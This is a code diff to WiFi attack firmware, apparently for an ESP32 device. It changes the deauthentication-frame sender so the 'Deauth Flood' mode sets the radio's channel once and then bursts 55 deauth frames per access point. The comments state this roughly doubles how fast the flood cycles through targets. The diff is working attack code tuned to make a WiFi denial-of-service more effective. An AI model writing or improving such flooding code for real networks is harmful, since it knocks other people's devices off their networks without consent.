@@ -10162,11 +10162,19 @@ void WiFiScan::sendProbeAttack(uint32_t currentTime) {
   }
 }
 
-void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
-  WiFiScan::set_channel = channel;
-  this->changeChannel(channel);
+void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6], bool switch_channel) {
+  // switch_channel=false lets a caller that already parked the radio on this
+  // channel (e.g. the Deauth Flood burst, 55 frames on one AP) skip the
+  // redundant per-frame retune. The delay(1) below stays either way -- it paces
+  // the burst and, critically, yields to FreeRTOS so a long attack keeps feeding
+  // the task watchdog. Callers that hop per frame (Deauth Targeted, Manual)
+  // leave switch_channel at its default (true).
+  if (switch_channel) {
+    WiFiScan::set_channel = channel;
+    this->changeChannel(channel);
+  }
   delay(1);
-  
+
   // Build AP source packet
   deauth_frame_default[4] = mac[0];
   deauth_frame_default[5] = mac[1];
@@ -13539,8 +13547,13 @@ void WiFiScan::main(uint32_t currentTime)
               this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
           }
         } else {
+          // Park the radio on this AP's channel ONCE, then burst all 55 frames
+          // without re-tuning on every frame -- roughly halves the per-AP dwell,
+          // so the flood cycles through selected APs about twice as fast.
+          this->set_channel = access_point.channel;
+          this->changeChannel(access_point.channel);
           for (int r = 0; r < 55; r++) {
-            this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
+            this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes, false);
           }
         }
       }
